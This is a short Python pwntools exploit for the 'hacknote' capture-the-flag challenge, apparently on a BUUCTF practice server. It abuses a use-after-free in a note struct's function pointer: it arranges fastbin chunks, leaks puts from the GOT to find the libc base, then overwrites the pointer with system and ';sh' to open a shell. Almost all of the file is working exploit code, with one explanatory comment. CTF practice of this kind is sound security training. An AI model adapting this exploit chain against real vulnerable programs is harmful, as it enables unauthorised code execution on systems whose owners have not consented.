from pwn import *
from LibcSearcher import *

import utils

context.arch = 'i386'
context.log_level = 'debug'

elf = ELF('../hacknote')
target = remote('node4.buuoj.cn', 25388)
libc = ELF('/home/kali/glibc-all-in-one/libs/2.23-i386/libc-2.23.so')

def allocate(size, content):
  target.sendlineafter('choice :', '1')
  target.sendlineafter('size :', str(size))
  target.sendafter('Content :', content)
  target.recvuntil('Success !')

def put(index):
  target.sendlineafter('choice :', '3')
  target.sendlineafter('Index :', str(index))

def free(index):
  target.sendlineafter('choice :', '2')
  target.sendlineafter('Index :', str(index))
  target.recvuntil('Success')

'''
The program constructs a note struct as follows.

typedef struct Note {
  void* func; // Pointer to the function.
  char* str;
} Note;

Initialization of Note would be like:
Note note { void (func*)(print_note_content), malloc(size), };

When the program frees the allocated Note type, it forgets to set the pointer to NULL. So we can exploit the UAF bug to get shell.
'''
puts = 0x804862B
puts_got = elf.got['puts']

allocate(0x18, b'a' * 0x18)
allocate(0x18, b'a' * 0x18)
free(1)
free(0)

# Fastbin[0x10]: chunk 0 -> chunk 1
# Fastbin[0x20]: str1 -> str0
# Allocate 0x10 will take two chunks from fastbin[0x10] so we can modify the content of chunk 1.
allocate(0x8, p32(puts) + p32(puts_got))
put(1)

puts_addr = u32(target.recv(4))
libc.address = puts_addr - libc.sym['puts']
system = libc.sym['system']
free(2)

allocate(0x8, p32(system) + b';sh\x00')
put(1)
target.interactive()